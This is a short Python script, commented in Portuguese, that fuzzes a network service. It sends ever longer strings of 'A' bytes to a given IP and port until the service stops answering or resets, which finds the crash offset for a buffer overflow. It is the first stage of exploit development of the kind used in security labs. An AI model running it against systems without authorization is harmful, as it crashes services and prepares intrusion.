#!/usr/bin/python

import socket
import argparse

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão de teste para um servidor e encontrar o offset de crash.")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("response", type=str, help="Resposta padrão da aplicação")

# Analisar os argumentos
args = parser.parse_args()

# Variáveis de entrada
crash = 1
client_ip = args.client_ip
client_port = args.client_port
rsp_msg = args.response.encode()

# Foi feito o acréscimo de 1 em 1 Byte para saber o valor exato que quebramos a aplicação.
try:
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((client_ip, client_port))
        print(f"Tried offset {crash}")
        pattern = client.recv(1024)
        client.send(b"A"*crash)
        pattern = client.recv(1024)
        if rsp_msg not in pattern: 
            print(f"OFFSET FOUND {crash}")
            break
        else:
            crash += 1
# Só será retornado quando a aplicação Reiniciar/Fechar
except ConnectionResetError:
    print(f"Crash em {crash}")